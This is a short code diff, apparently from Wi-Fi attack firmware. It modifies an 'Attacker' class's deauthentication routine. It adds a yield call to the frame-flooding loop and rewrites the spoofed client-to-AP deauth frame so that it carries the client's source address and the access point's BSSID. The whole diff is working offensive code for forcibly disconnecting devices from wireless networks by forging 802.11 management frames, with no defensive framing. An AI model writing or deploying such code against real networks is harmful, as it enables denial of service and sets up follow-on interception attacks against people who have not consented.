@@ -115,11 +115,14 @@ void Attacker::_tickDeauth() {
     for (uint8_t i = 0; i < _frames; i++) {
         int len = FrameBuilder::buildDeauth(buf, t.bssid, da, _reason);
         if (_txFrame(buf, len)) _stats.deauths_sent++;
-        if (_delay_ms > 0) delay(_delay_ms);
+        if (_delay_ms > 0) { yield(); delay(_delay_ms); }
     }
-    // Also send deauth to AP pretending to be the client (if directed)
+    // Bidirectional deauth: also spoof client→AP direction
     if (_mode == ATK_DEAUTH && memcmp(da, BCAST, 6) != 0) {
-        int len = FrameBuilder::buildDeauth(buf, t.bssid, t.bssid, _reason);
+        // SA=client, DA=AP, BSSID=AP
+        int len = FrameBuilder::buildDeauth(buf, t.client, t.bssid, _reason);
+        // buildDeauth sets BSSID=SA(t.client); override to AP BSSID
+        memcpy(buf + 16, t.bssid, 6);
         if (_txFrame(buf, len)) _stats.deauths_sent++;
     }
 }
